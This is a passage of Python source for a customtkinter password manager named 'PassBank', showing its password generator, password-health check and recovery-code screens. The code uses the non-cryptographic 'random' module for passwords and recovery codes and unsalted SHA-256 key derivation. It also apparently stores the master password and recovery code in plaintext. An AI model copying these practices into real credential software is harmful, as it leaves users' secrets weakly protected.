                    title_entry.bind("<KeyRelease>", on_entry_change)

                    warning = customtkinter.CTkLabel(master=add_password_frame, text='* Required', font=customtkinter.CTkFont(family="Roboto", size=12))
                    warning.pack(padx=10, anchor="w")
                    
                    customtkinter.CTkLabel(master=add_password_frame, text='Login Details', font=customtkinter.CTkFont(family="Roboto", size=19, weight="bold")).pack(pady=(30,5),anchor="w")

                    Email_Username_entry = customtkinter.CTkEntry(master=add_password_frame,placeholder_text="Email or Username", font=customtkinter.CTkFont(family="Roboto", size=15), width=480, height=50 )
                    Email_Username_entry.pack(pady=8)

                    password_1 = customtkinter.CTkEntry(master=add_password_frame,placeholder_text="Password", font=customtkinter.CTkFont(family="Roboto", size=15), width=480, height=50, show="●" )
                    password_1.pack()

                    if password_saved == "":
                        pass
                    else:
                        password_1.insert(0, password_saved)


                    generate_label = customtkinter.CTkLabel(master=add_password_frame, text='Generate Password', font=customtkinter.CTkFont(family="Sans Seriff", size=14), text_color="#40AFAF", cursor="hand2")
                    generate_label.pack(anchor="e")
                    generate_label.bind("<Button-1>", open_generate_password_new)
                    
                    website_address_entry = customtkinter.CTkEntry(master=add_password_frame,placeholder_text="Website Address", font=customtkinter.CTkFont(family="Roboto", size=15), width=480, height=50 )
                    website_address_entry.pack(pady=50)   

                    save_button = customtkinter.CTkButton(master=add_password_frame, text="Save",font=customtkinter.CTkFont(family="Roboto", size=15), height=40, width=90, corner_radius=50, fg_color="#0C888D", hover_color="#0BA1A2")
                    save_button.pack()
                    save_button.bind("<Button-1>", save_data)

                def open_generate_password(event):
                    password_main_frame.place_forget()
                    add_password_main_frame.place_forget()
                    generate_password_main_frame.place_forget()
                    check_password_main_frame.place_forget()
                    generate_password_main_frame2.place_forget()
                    get_started_main_frame1.place_forget()
                    profile_settings_main_frame.place_forget()
                    
                    generate_password_main_frame2.place(x=250,y=0)

                    def copy(event):
                        root.clipboard_clear()
                        root.clipboard_append(password.cget("text"))
                        copy_label.configure(text="Copied")
                        copy_text_frame.place(x=845, y=100)

                    def copy_leave(event):
                        copy_label.configure(text="Copy")
                        copy_text_frame.place_forget()

                    def copy_enter(event):
                        copy_text_frame.place(x=845, y=100)


                    def generate(event):
                        num_val = slider.get()
                        slider_event(num_val)
                        generate_text_frame.place(x=780, y=100)

                    def generate_leave(event):
                        generate_text_frame.place_forget()

                    def generate_enter(event):
                        generate_text_frame.place(x=780, y=100)

                    def add(event):
                        add_text_frame.place(x=730, y=100)
                        open_add_password(event=1, password_saved=password.cget("text"))

                    def add_leave(event):
                        add_text_frame.place_forget()

                    def add_enter(event):
                        add_text_frame.place(x=730, y=100)


                    title_frame = customtkinter.CTkFrame(generate_password_main_frame2,width=1030,height=80, fg_color="#262626", corner_radius=0)
                    title_frame.pack(fill="x")

                    customtkinter.CTkLabel(master=title_frame, text='Password Generator', font=customtkinter.CTkFont(family="Roboto", size=30, weight="bold")).place(relx=0.5, rely=0.5, anchor="center")

                    generate_frame = customtkinter.CTkFrame(generate_password_main_frame2, width=1030, height=200, fg_color="#151922", corner_radius=0)
                    generate_frame.pack()    

                    copy_button = customtkinter.CTkLabel(master=generate_frame, text="",cursor="hand2", font=customtkinter.CTkFont(family="Roboto", size=15), image=PhotoImage(file=folder_path+r"\copy2.png"))
                    copy_button.place(x=850, y=140)
                    copy_button.bind("<Button-1>", copy)
                    copy_button.bind("<Leave>", copy_leave)
                    copy_button.bind("<Enter>", copy_enter)

                    generate_button = customtkinter.CTkLabel(master=generate_frame, text="",cursor="hand2", font=customtkinter.CTkFont(family="Roboto", size=15), image=PhotoImage(file=folder_path+r"\generate.png"))
                    generate_button.place(x=795, y=140)
                    generate_button.bind("<Button-1>", generate)
                    generate_button.bind("<Leave>", generate_leave)
                    generate_button.bind("<Enter>", generate_enter)

                    add_button = customtkinter.CTkLabel(master=generate_frame, text="",cursor="hand2", font=customtkinter.CTkFont(family="Roboto", size=15), image=PhotoImage(file=folder_path+r"\cross.png"))
                    add_button.place(x=740, y=140)
                    add_button.bind("<Button-1>", add)
                    add_button.bind("<Leave>", add_leave)
                    add_button.bind("<Enter>", add_enter)

                    password = customtkinter.CTkLabel(master=generate_frame, wraplength=800,justify="left",anchor="w",text='', font=customtkinter.CTkFont(family="Roboto", size=30, weight="bold"))
                    
                    copy_text_frame = customtkinter.CTkFrame(generate_frame, width=50, height=30, fg_color="#151922",corner_radius=10)
                    copy_text_frame.propagate(False)

                    copy_text_frame_inner = customtkinter.CTkFrame(copy_text_frame, fg_color="#262626",corner_radius=10)
                    copy_text_frame_inner.pack(fill='both', expand=True)

                    copy_label = customtkinter.CTkLabel(copy_text_frame_inner, text="Copy")
                    copy_label.pack()

                    generate_text_frame = customtkinter.CTkFrame(generate_frame, width=70, height=30, fg_color="#151922",corner_radius=10)
                    generate_text_frame.propagate(False)

                    generate_text_frame_inner = customtkinter.CTkFrame(generate_text_frame, fg_color="#262626",corner_radius=10)
                    generate_text_frame_inner.pack(fill='both', expand=True)

                    generate_label = customtkinter.CTkLabel(generate_text_frame_inner, text="Generate")
                    generate_label.pack()

                    add_text_frame = customtkinter.CTkFrame(generate_frame, width=50, height=30, fg_color="#151922",corner_radius=10)
                    add_text_frame.propagate(False)

                    add_text_frame_inner = customtkinter.CTkFrame(add_text_frame, fg_color="#262626",corner_radius=10)
                    add_text_frame_inner.pack(fill='both', expand=True)

                    add_label = customtkinter.CTkLabel(add_text_frame_inner, text="Save")
                    add_label.pack()

                    details_frame = customtkinter.CTkFrame(generate_password_main_frame2, width=1030, height=500, corner_radius=0)
                    length_frame = customtkinter.CTkFrame(details_frame, width=1030, height=100, fg_color="#262626", corner_radius=0)
                    length_display = customtkinter.CTkLabel(master=length_frame, text='8', font=customtkinter.CTkFont(family="Roboto", size=19))


                    def slider_event(value):
                        caps = switch_var1.get() == "on"
                        digits = switch_var2.get() == "on"
                        symbols = switch_var3.get() == "on"

                        def generate_random_password(length):
                            characters = string.ascii_lowercase
                            if digits:
                                characters += string.digits
                            if symbols:
                                characters += "@!$%&*"
                            if caps:
                                characters += string.ascii_uppercase
                            if not characters:
                                return "Select at least one option"

                            password = ''.join(random.choice(characters) for _ in range(length))
                            return password

                        random_password = generate_random_password(round(value))
                        password.configure(text=random_password)
                        length_display.configure(text=round(value))

                    password.place(x=115, y=40)

                    details_frame.pack()    
                    details_frame.propagate(False)

                    length_frame.pack()

                    length_display.place(x=860, y=38)

                    slider = customtkinter.CTkSlider(length_frame, from_=8, to=60, width=230, command=slider_event)
                    slider.set(8)
                    slider.place(x=610, y=42)

                    customtkinter.CTkLabel(master=length_frame, text='Length', font=customtkinter.CTkFont(family="Roboto", size=18)).place(x=175, y=40)

                    caps_frame = customtkinter.CTkFrame(details_frame, width=1030, height=100, fg_color="#262626", corner_radius=0)
                    caps_frame.pack()

                    switch_var1 = customtkinter.StringVar(value="on")
                    switch1 = customtkinter.CTkSwitch(caps_frame, text="",variable=switch_var1, onvalue="on", offvalue="off",  switch_height=23, switch_width=45)
                    switch1.place(x=830, y=40)

                    customtkinter.CTkLabel(master=caps_frame, text='Use capital letter (A-Z)', font=customtkinter.CTkFont(family="Roboto", size=18)).place(x=175, y=40)

                    digits_frame = customtkinter.CTkFrame(details_frame, width=1030, height=100, fg_color="#262626", corner_radius=0)
                    digits_frame.pack()

                    switch_var2 = customtkinter.StringVar(value="on")
                    switch2 = customtkinter.CTkSwitch(digits_frame, text="",variable=switch_var2, onvalue="on", offvalue="off",  switch_height=23, switch_width=45)
                    switch2.place(x=830, y=40)

                    customtkinter.CTkLabel(master=digits_frame, text='Use digitis (0-9)', font=customtkinter.CTkFont(family="Roboto", size=18)).place(x=175, y=40)

                    symbols_frame = customtkinter.CTkFrame(details_frame, width=1030, height=140, fg_color="#262626", corner_radius=0)
                    symbols_frame.pack()

                    switch_var3 = customtkinter.StringVar(value="on")
                    switch3 = customtkinter.CTkSwitch(symbols_frame, text="",variable=switch_var3, onvalue="on", offvalue="off", switch_height=23, switch_width=45)
                    switch3.place(x=830, y=40)

                    customtkinter.CTkLabel(master=symbols_frame, text='Use symbols (@!$%&*)', font=customtkinter.CTkFont(family="Roboto", size=18)).place(x=175, y=40)



                    slider_event(8)

                def open_check_password(event):
                    password_main_frame.place_forget()
                    add_password_main_frame.place_forget()
                    generate_password_main_frame.place_forget()
                    check_password_main_frame.place_forget()
                    get_started_main_frame1.place_forget()
                    profile_settings_main_frame.place_forget()
                    
                    check_password_main_frame.place(x=240,y=40)
                    check_password_main_frame.propagate(False)
                    
                    generate_password_main_frame2.place_forget()

                    weak_password_count = 0
                    same_password = 0
                    pwned_passwords = 0

                    def is_strong_password(value):
                        if len(value) < 8:
                            return False

                        if not re.search(r'[A-Z]', value):
                            return False

                        if not re.search(r'[a-z]', value):
                            return False

                        if not re.search(r'[0-9]', value):
                            return False

                        if not re.search(r'[!@#$%^&*(),.?":{}|<>]', value):
                            return False

                        return True

                    data = db.child("users").child(f"{auth.current_user['localId']}").child("passwords").get().val()

                    if data == None:
                        frame1 = customtkinter.CTkFrame(check_password_main_frame, width=900, height=180, fg_color="#212121", corner_radius=8, cursor="hand2")
                        frame1.pack(padx=(30,20),pady=(20,10))
                        frame1.propagate(False)

                        shield = PhotoImage(file=folder_path+r"\shield.png")
                        shield = customtkinter.CTkLabel(master=frame1, text="", font=customtkinter.CTkFont(family="Roboto", size=15), image=shield)
                        shield.place(x=50,y=40)

                        text1 = customtkinter.CTkLabel(master=frame1, text="Weak Passwords", text_color="#F64F64",font=customtkinter.CTkFont(family="Roboto", size=29))
                        text1.place(x=120,y=43)
                        
                        text2 = customtkinter.CTkLabel(master=frame1, text="Makes your accounts easier to brute force attacks", text_color="#95979C",font=customtkinter.CTkFont(family="Roboto", size=15))
                        text2.place(x=123,y=75)

                        text3 = customtkinter.CTkLabel(master=frame1, text="0", text_color="white",font=customtkinter.CTkFont(family="Roboto", size=40, weight="bold"))
                        text3.place(x=70,y=110)

                        text4 = customtkinter.CTkLabel(master=frame1, text="accounts", text_color="#95979C",font=customtkinter.CTkFont(family="Roboto", size=30, weight="bold"))
                        text4.place(x=103,y=118)

                        frame2 = customtkinter.CTkFrame(check_password_main_frame, width=900, height=180, fg_color="#212121", corner_radius=8, cursor="hand2")
                        frame2.pack(padx=(30,20),pady=10)
                        frame2.propagate(False)

                        copy = PhotoImage(file=folder_path+r"\copy.png")
                        copy = customtkinter.CTkLabel(master=frame2, text="", font=customtkinter.CTkFont(family="Roboto", size=15), image=copy)
                        copy.place(x=50,y=40)

                        text1 = customtkinter.CTkLabel(master=frame2, text="Reused Passwords", text_color="#F64F64",font=customtkinter.CTkFont(family="Roboto", size=29))
                        text1.place(x=120,y=43)
                        
                        text2 = customtkinter.CTkLabel(master=frame2, text="Used for multiple accounts", text_color="#95979C",font=customtkinter.CTkFont(family="Roboto", size=15))
                        text2.place(x=123,y=75)
                        
                        text3 = customtkinter.CTkLabel(master=frame2, text="0", text_color="white",font=customtkinter.CTkFont(family="Roboto", size=40, weight="bold"))
                        text3.place(x=70,y=110)

                        text4 = customtkinter.CTkLabel(master=frame2, text="accounts", text_color="#95979C",font=customtkinter.CTkFont(family="Roboto", size=30, weight="bold"))
                        text4.place(x=103,y=118)

                        frame3 = customtkinter.CTkFrame(check_password_main_frame, width=900, height=180, fg_color="#212121", corner_radius=8, cursor="hand2")
                        frame3.pack(padx=(30,20),pady=10)
                        frame3.propagate(False)

                        breach = PhotoImage(file=folder_path+r"\breach.png")
                        breach = customtkinter.CTkLabel(master=frame3, text="", font=customtkinter.CTkFont(family="Roboto", size=15), image=breach)
                        breach.place(x=50,y=30)

                        text1 = customtkinter.CTkLabel(master=frame3, text="Data Breach Scanner", text_color="#FF7E23",font=customtkinter.CTkFont(family="Roboto", size=29))
                        text1.place(x=120,y=33)
                        
                        text2 = customtkinter.CTkLabel(master=frame3, text="Find out which passwords were exposed", text_color="#95979C",font=customtkinter.CTkFont(family="Roboto", size=15))
                        text2.place(x=123,y=60)
                        
                        pwned = customtkinter.CTkLabel(master=frame3, text="0", text_color="white",font=customtkinter.CTkFont(family="Roboto", size=40, weight="bold"))
                        pwned.place(x=70,y=105)

                        text4 = customtkinter.CTkLabel(master=frame3, text="accounts", text_color="#95979C",font=customtkinter.CTkFont(family="Roboto", size=30, weight="bold"))
                        text4.place(x=103,y=113)
                        
                        return


                    passwords = [value['password'] for value in data.values()]
                    passwords.sort()
                    
                    passwords_decrypted = []

                    for x in passwords:
                        key = base64.urlsafe_b64encode(hashlib.sha256(master_password.encode()).digest()[:32]).decode()
                        cipher_suite = Fernet(key)
                        password_decrypted = cipher_suite.decrypt(x).decode()
                        passwords_decrypted.append(password_decrypted)

                    for password in passwords_decrypted:
                        if is_strong_password(password):
                            pass
                        else:
                            weak_password_count += 1

                    for x in range(len(passwords_decrypted)):
                        a = passwords_decrypted[x]
                        try:
                            b = passwords_decrypted[x+1]
                        except:
                            break

                        if a == b:
                            same_password += 1

                    frame1 = customtkinter.CTkFrame(check_password_main_frame, width=900, height=180, fg_color="#212121", corner_radius=8, cursor="hand2")
                    frame1.pack(padx=(45,0),pady=(20,10))
                    frame1.propagate(False)

                    shield = PhotoImage(file=folder_path+r"\shield.png")
                    shield = customtkinter.CTkLabel(master=frame1, text="", font=customtkinter.CTkFont(family="Roboto", size=15), image=shield)
                    shield.place(x=50,y=40)

                    text1 = customtkinter.CTkLabel(master=frame1, text="Weak Passwords", text_color="#F64F64",font=customtkinter.CTkFont(family="Roboto", size=29))
                    text1.place(x=120,y=43)
                    
                    text2 = customtkinter.CTkLabel(master=frame1, text="Makes your accounts easier to brute force attacks", text_color="#95979C",font=customtkinter.CTkFont(family="Roboto", size=15))
                    text2.place(x=123,y=75)
                    
                    text3 = customtkinter.CTkLabel(master=frame1, text=weak_password_count, text_color="white",font=customtkinter.CTkFont(family="Roboto", size=40, weight="bold"))
                    text3.place(x=70,y=110)

                    text4 = customtkinter.CTkLabel(master=frame1, text="accounts", text_color="#95979C",font=customtkinter.CTkFont(family="Roboto", size=30, weight="bold"))
                    text4.place(x=103,y=118)

                    frame2 = customtkinter.CTkFrame(check_password_main_frame, width=900, height=180, fg_color="#212121", corner_radius=8, cursor="hand2")
                    frame2.pack(padx=(45,0),pady=10)
                    frame2.propagate(False)

                    copy = PhotoImage(file=folder_path+r"\copy.png")
                    copy = customtkinter.CTkLabel(master=frame2, text="", font=customtkinter.CTkFont(family="Roboto", size=15), image=copy)
                    copy.place(x=50,y=40)

                    text1 = customtkinter.CTkLabel(master=frame2, text="Reused Passwords", text_color="#F64F64",font=customtkinter.CTkFont(family="Roboto", size=29))
                    text1.place(x=120,y=43)
                    
                    text2 = customtkinter.CTkLabel(master=frame2, text="Used for multiple accounts", text_color="#95979C",font=customtkinter.CTkFont(family="Roboto", size=15))
                    text2.place(x=123,y=75)
                    
                    text3 = customtkinter.CTkLabel(master=frame2, text=same_password*2, text_color="white",font=customtkinter.CTkFont(family="Roboto", size=40, weight="bold"))
                    text3.place(x=70,y=110)

                    text4 = customtkinter.CTkLabel(master=frame2, text="accounts", text_color="#95979C",font=customtkinter.CTkFont(family="Roboto", size=30, weight="bold"))
                    text4.place(x=103,y=118)

                    frame3 = customtkinter.CTkFrame(check_password_main_frame, width=900, height=180, fg_color="#212121", corner_radius=8, cursor="hand2")
                    frame3.pack(padx=(45,0),pady=10)
                    frame3.propagate(False)

                    breach = PhotoImage(file=folder_path+r"\breach.png")
                    breach = customtkinter.CTkLabel(master=frame3, text="", font=customtkinter.CTkFont(family="Roboto", size=15), image=breach)
                    breach.place(x=50,y=30)

                    text1 = customtkinter.CTkLabel(master=frame3, text="Data Breach Scanner", text_color="#FF7E23",font=customtkinter.CTkFont(family="Roboto", size=29))
                    text1.place(x=120,y=33)
                    
                    text2 = customtkinter.CTkLabel(master=frame3, text="Find out which passwords were exposed", text_color="#95979C",font=customtkinter.CTkFont(family="Roboto", size=15))
                    text2.place(x=123,y=65)
                    
                    pwned = customtkinter.CTkLabel(master=frame3, text="0", text_color="white",font=customtkinter.CTkFont(family="Roboto", size=40, weight="bold"))
                    pwned.place(x=70,y=105)

                    text4 = customtkinter.CTkLabel(master=frame3, text="accounts", text_color="#95979C",font=customtkinter.CTkFont(family="Roboto", size=30, weight="bold"))
                    text4.place(x=103,y=113)

                    def check_password(password):
                        if pwnedpasswords.check(password):
                            return 1
                        else:
                            return 0

                    with concurrent.futures.ThreadPoolExecutor(max_workers=4) as executor:
                        results = executor.map(check_password, passwords_decrypted)
                    for result in results:
                        pwned_passwords += result
                    pwned.configure(text=pwned_passwords)

                def open_get_started(event):
                    password_main_frame.place_forget()
                    add_password_main_frame.place_forget()
                    generate_password_main_frame.place_forget()
                    check_password_main_frame.place_forget()
                    add_secure_notes_main_frame.place_forget()
                    generate_password_main_frame2.place_forget()
                    profile_settings_main_frame.place_forget()

                    def recovery(event):
                        x, y = root.winfo_rootx(), root.winfo_rooty()
                        w, h = root.winfo_width(), root.winfo_height()
                        screenshot = ImageGrab.grab(bbox=(x, y, x + w, y + h))
                        blurred_screenshot = screenshot.filter(ImageFilter.GaussianBlur(radius=2))
                        blurred_screenshot.save(folder_path+r"\screenshot.png")

                        button_image = customtkinter.CTkImage(Image.open(folder_path+r"\screenshot.png"), size=(1280, 700))
                        image_button = customtkinter.CTkLabel(master=root, text="",image=button_image)
                        image_button.place(relx=0.5, rely=0.5, anchor="center")

                        confirm_frame = customtkinter.CTkFrame(root, width=500, height=180, corner_radius=8, cursor="hand2", border_color="#383C43", border_width=1)

                        master_password_frame = customtkinter.CTkFrame(root, width=500, height=220, corner_radius=8, cursor="hand2", border_color="#383C43", border_width=1)

                        recovery_code_frame = customtkinter.CTkFrame(root, width=500, height=260, corner_radius=8, cursor="hand2", border_color="#383C43", border_width=1)


                        def on_enter(event):
                            reset_button.configure(fg_color="#412F3A")  
                            reset_button.configure(border_color="#A23F4B")  

                        def on_leave(event):
                            reset_button.configure(fg_color="#2B2B2B") 
                            reset_button.configure(border_color="#696E77")  

                        def close_window(event):
                            master_password_frame.place_forget()
                            confirm_frame.place_forget()
                            image_button.place_forget()

                        def master_password_enter():
                            confirm_frame.place_forget()
                            master_password_frame.place(relx=0.55, rely=0.5, anchor="center")
                            master_password_frame.propagate(False)

                            check_password = customtkinter.CTkEntry(master=master_password_frame, placeholder_text="Master Password",width=460,height=40, show="●",font=customtkinter.CTkFont(family="Rem"))

                            master_password_alerts = customtkinter.CTkLabel(master_password_frame, text="Incorrect Master Password",font=customtkinter.CTkFont(family="Roboto", size=13), text_color="#d42f2f")

                            def check():
                                final_password = check_password.get()

                                key = base64.urlsafe_b64encode(hashlib.sha256(final_password.encode()).digest()[:32]).decode()
                                cipher_suite = Fernet(key)
                                
                                hashed = db.child("users").child(f"{auth.current_user['localId']}").child("user-details").get().val()['master_password']
                                
                                try:
                                    if hashed == final_password:
                                        confirm_frame.place_forget()
                                        master_password_frame.place_forget()

                                        recovery_code_frame.place(relx=0.55, rely=0.5, anchor="center")
                                        recovery_code_frame.propagate(False)

                                        customtkinter.CTkLabel(master=recovery_code_frame, text="Your new Recovery Code", font=customtkinter.CTkFont(family="Rem", size=22, weight="bold")).pack(anchor="w", pady=(20,10), padx=20)
                                        customtkinter.CTkLabel(master=recovery_code_frame, text="Make sure to keep your Recovery Code in a safe place. If you forget this code and your Master Password, you may lose access to all of your saved items.",wraplength=450,justify="left",anchor="w", text_color="#95978F",font=customtkinter.CTkFont(family="Rem", size=14, weight="bold")).pack(anchor="w", pady=(0,10), padx=20)

                                        text_frame = customtkinter.CTkFrame(recovery_code_frame, width=460, height=40, corner_radius=25, border_color="#383C43", border_width=1).pack(pady=20)
                                        text_copy = customtkinter.CTkLabel(master=text_frame, text="Copy",cursor="hand2",bg_color="#292929",text_color="#3EA5A1", font=customtkinter.CTkFont(family="Roboto", size=16))
                                        
                                        close = customtkinter.CTkLabel(master=recovery_code_frame, text="",image=PhotoImage(file=folder_path+r"\circle.png"),cursor="hand2", font=customtkinter.CTkFont(family="Roboto", size=20))

                                        def generate_random_code():
                                            code_format = 'XXXX-XXXX-XXXX-XXXX-XXXX-XXXX'
                                            
                                            def random_char():
                                                return random.choice(string.ascii_uppercase + string.digits)
                                            
                                            generated_code = ''.join(random_char() if c == 'X' else c for c in code_format)
                                            
                                            return generated_code

                                        random_code = generate_random_code()

                                        code = customtkinter.CTkLabel(master=text_frame, text=random_code, bg_color="#292929" ,font=customtkinter.CTkFont(family="Rem", size=20))
                                        line = customtkinter.CTkLabel(master=text_frame, text="",image=PhotoImage(file=folder_path+r"\line.png"),cursor="hand2", font=customtkinter.CTkFont(family="Roboto", size=20))
                                        
                                        def copy_code(event):
                                            root.clipboard_clear()
                                            root.clipboard_append(random_code)

                                        def close_window1(event):
                                            master_password_frame.place_forget()
                                            confirm_frame.place_forget()
                                            image_button.place_forget()
                                            recovery_code_frame.place_forget()
                                            line.place_forget()
                                            code.place_forget()
                                            text_copy.place_forget()
                                            close.place_forget()

                                        code.place(relx=0.515, rely=0.539, anchor="center")

                                        done_button = customtkinter.CTkButton(master=recovery_code_frame, text="Done",font=customtkinter.CTkFont(family="Rem", size=15), height=40, width=90, corner_radius=50, fg_color="#0C888D", border_color="#696E77", border_width=1,hover_color="#0E666A" )
                                        done_button.pack(side="right",padx=(20,20))
                                        done_button.bind("<Button-1>", close_window1)

                                        line.place(x=850, y=360)
                                        
                                        text_copy.place(x=873, y=368)
                                        text_copy.bind("<Button-1>", copy_code)
                                        
                                        db.child("users").child(f"{auth.current_user['localId']}").child("user-details").update({"master_password_recovery_code" : random_code })

                                        close.place(x=450, y=12)
                                        close.bind("<Button-1>", close_window1)


                                except:
                                    master_password_alerts.place(x=23, y=140)

                                
                            customtkinter.CTkLabel(master=master_password_frame, text="Master Password Required", font=customtkinter.CTkFont(family="Rem", size=22, weight="bold")).pack(anchor="w", pady=(20,10), padx=20)
                            customtkinter.CTkLabel(master=master_password_frame, text="To continue enter your Master Password", wraplength=450, justify="left", anchor="w", text_color="#95978F",font=customtkinter.CTkFont(family="Rem", size=14, weight="bold")).pack(anchor="w", pady=(0,10), padx=20)

                            check_password.pack()

                            continue_button = customtkinter.CTkButton(master=master_password_frame, text="Continue",font=customtkinter.CTkFont(family="Rem", size=15), height=40, width=90, corner_radius=50, fg_color="#0C888D", border_color="#696E77", border_width=1,hover_color="#0E666A", command=check )
                            continue_button.pack(side="right",padx=(0,20))


                            close = customtkinter.CTkLabel(master=master_password_frame, text="",image=PhotoImage(file=folder_path+r"\circle.png"),cursor="hand2", font=customtkinter.CTkFont(family="Roboto", size=20))
                            close.place(x=450, y=12)
                            close.bind("<Button-1>", close_window)

                        confirm_frame.place(relx=0.55, rely=0.5, anchor="center")
                        confirm_frame.propagate(False)

                        customtkinter.CTkLabel(master=confirm_frame, text="Reset Recovery Code?", font=customtkinter.CTkFont(family="Rem", size=22, weight="bold")).pack(anchor="w", pady=(20,10), padx=20)
                        customtkinter.CTkLabel(master=confirm_frame, text="All previous Recovery Codes that you've generated will no longer be valid.",wraplength=450,justify="left",anchor="w", text_color="#95978F",font=customtkinter.CTkFont(family="Rem", size=14)).pack(anchor="w", pady=(15,10), padx=20)

                        reset_button = customtkinter.CTkButton(master=confirm_frame, text="Reset",font=customtkinter.CTkFont(family="Rem", size=15), height=40, width=90, corner_radius=50, fg_color="#2B2B2B", border_color="#696E77",text_color="#F95D63", border_width=1,hover_color="#412F3A", command=master_password_enter )
                        reset_button.pack(side="right",padx=(0,20))

                        reset_button.bind("<Enter>", on_enter)
                        reset_button.bind("<Leave>", on_leave)

                        cancel_button = customtkinter.CTkButton(master=confirm_frame, text="Cancel",font=customtkinter.CTkFont(family="Rem", size=15), height=40, width=90, corner_radius=50, fg_color="#2B2B2B", border_color="#696E77", border_width=1, hover_color="#373B44")
                        cancel_button.pack(side="right", padx=10)            
                        cancel_button.bind("<Button-1>", close_window)
                        
                        close = customtkinter.CTkLabel(master=confirm_frame, text="",image=PhotoImage(file=folder_path+r"\circle.png"),cursor="hand2", font=customtkinter.CTkFont(family="Roboto", size=20))
                        close.place(x=450, y=12)
                        close.bind("<Button-1>", close_window)


                    get_started_main_frame1.place(x=240,y=10)
                    get_started_main_frame1.propagate(False)

                    get_started_frame1 = customtkinter.CTkFrame(get_started_main_frame1, bg_color="#1A1A1A", fg_color="#1A1A1A", width=1000, height=100)
                    get_started_frame1.place(relx=0.5, rely=0.1, anchor="center")
                    get_started_frame1.propagate(False)

                    customtkinter.CTkLabel(master=get_started_frame1, text="Get Started with PassBank", font=customtkinter.CTkFont(family="Roboto", size=30, weight="bold")).pack()
                    customtkinter.CTkLabel(master=get_started_frame1, text="Now that your account has been created. its time to start exploring how you can make your life online easier and more secure.", font=customtkinter.CTkFont(family="Roboto", size=13)).pack()
                                
                    frame1 = customtkinter.CTkFrame(get_started_main_frame1, width=900, height=130, fg_color="#212121", corner_radius=8, cursor="hand2")
                    frame1.pack(padx=(50,20),pady=(120,10))
                    frame1.propagate(False)

                    shield = PhotoImage(file=folder_path+r"\plus.png")
                    shield = customtkinter.CTkLabel(master=frame1, text="", font=customtkinter.CTkFont(family="Roboto", size=15), image=shield)
                    shield.place(x=50,y=30)

                    text1 = customtkinter.CTkLabel(master=frame1, text="Create first password",font=customtkinter.CTkFont(family="Roboto", size=24))
                    text1.place(x=120,y=25)
                    
                    text2 = customtkinter.CTkLabel(master=frame1, text="Import a password you have stored online or add a brand new one", text_color="#95979C",font=customtkinter.CTkFont(family="Roboto", size=15))
                    text2.place(x=123,y=55)

                    text2 = customtkinter.CTkLabel(master=frame1, text="Import a password", text_color="#3D9BA1",font=customtkinter.CTkFont(family="Roboto", size=15))
                    text2.place(x=123,y=80)
                    text2.bind('<Button-1>', import_password)

                    customtkinter.CTkLabel(master=frame1, text="●", text_color="#3D9BA1",font=customtkinter.CTkFont(family="Roboto", size=15)).place(x=253,y=80)
                    
                    add = customtkinter.CTkLabel(master=frame1, text="Add new password", text_color="#3D9BA1",font=customtkinter.CTkFont(family="Roboto", size=15))
                    add.place(x=270,y=80)
                    add.bind("<Button-1>", lambda event, password_saved="": open_add_password(password_saved="", event=""))

                    frame2 = customtkinter.CTkFrame(get_started_main_frame1, width=900, height=110, fg_color="#212121", corner_radius=8, cursor="hand2")
                    frame2.pack(padx=(50,20),pady=10)
                    frame2.propagate(False)
                    frame2.bind("<Button-1>", open_add_secure_note)

                    copy = PhotoImage(file=folder_path+r"\note_g.png")
                    copy = customtkinter.CTkLabel(master=frame2, text="", font=customtkinter.CTkFont(family="Roboto", size=15), image=copy)
                    copy.place(x=50,y=30)
                    copy.bind("<Button-1>", open_add_secure_note)

                    right_arrow = PhotoImage(file=folder_path+r"\right-arrow.png")
                    right_arrow = customtkinter.CTkLabel(master=frame2, text="", font=customtkinter.CTkFont(family="Roboto", size=15), image=right_arrow)
                    right_arrow.place(x=840,y=40)
                    right_arrow.bind("<Button-1>", open_add_secure_note)

                    text1 = customtkinter.CTkLabel(master=frame2, text="Create first secure note", font=customtkinter.CTkFont(family="Roboto", size=24))
                    text1.place(x=120,y=31)
                    text1.bind("<Button-1>", open_add_secure_note)
                    
                    text2 = customtkinter.CTkLabel(master=frame2, text="Adding your first secure note: safeguarding secrets digitally.", text_color="#95979C",font=customtkinter.CTkFont(family="Roboto", size=15))
                    text2.place(x=123,y=60)
                    text2.bind("<Button-1>", open_add_secure_note)

                    frame3 = customtkinter.CTkFrame(get_started_main_frame1, width=900, height=110, fg_color="#212121", corner_radius=8, cursor="hand2")
                    frame3.pack(padx=(50,20),pady=10)
                    frame3.propagate(False)
                    frame3.bind("<Button-1>", recovery)

                    copy = PhotoImage(file=folder_path+r"\key.png")
                    copy = customtkinter.CTkLabel(master=frame3, text="", font=customtkinter.CTkFont(family="Roboto", size=15), image=copy)
                    copy.place(x=50,y=30)
                    copy.bind("<Button-1>", recovery)

                    right_arrow = PhotoImage(file=folder_path+r"\right-arrow.png")
                    right_arrow = customtkinter.CTkLabel(master=frame3, text="", font=customtkinter.CTkFont(family="Roboto", size=15), image=right_arrow)
                    right_arrow.place(x=840,y=40)
                    right_arrow.bind("<Button-1>", recovery)

                    text1 = customtkinter.CTkLabel(master=frame3, text="Save Recovery Code", font=customtkinter.CTkFont(family="Roboto", size=24))
                    text1.place(x=120,y=26)
                    text1.bind("<Button-1>", recovery)
                    
                    text2 = customtkinter.CTkLabel(master=frame3, text="This code can be used to regain access to your account if you forget you Master password", text_color="#95979C",font=customtkinter.CTkFont(family="Roboto", size=15))
                    text2.place(x=123,y=55)
                    text2.bind("<Button-1>", recovery)
                    
                    frame4 = customtkinter.CTkFrame(get_started_main_frame1, width=900, height=110, fg_color="#212121", corner_radius=8, cursor="hand2")
                    frame4.pack(padx=(50,20),pady=10)
                    frame4.propagate(False)
                    frame4.bind("<Button-1>", open_check_password)

                    copy = PhotoImage(file=folder_path+r"\health.png")
                    copy = customtkinter.CTkLabel(master=frame4, text="", font=customtkinter.CTkFont(family="Roboto", size=15), image=copy)
                    copy.place(x=50,y=30)
                    copy.bind("<Button-1>", open_check_password)

                    right_arrow = PhotoImage(file=folder_path+r"\right-arrow.png")
                    right_arrow = customtkinter.CTkLabel(master=frame4, text="", font=customtkinter.CTkFont(family="Roboto", size=15), image=right_arrow)
                    right_arrow.place(x=840,y=40)
                    right_arrow.bind("<Button-1>", open_check_password)

                    text1 = customtkinter.CTkLabel(master=frame4, text="Check password health", font=customtkinter.CTkFont(family="Roboto", size=24))
                    text1.place(x=120,y=26)
                    text1.bind("<Button-1>", open_check_password)
                    
                    text2 = customtkinter.CTkLabel(master=frame4, text="Check password health for stronger online security.", text_color="#95979C",font=customtkinter.CTkFont(family="Roboto", size=15))
                    text2.place(x=123,y=55)
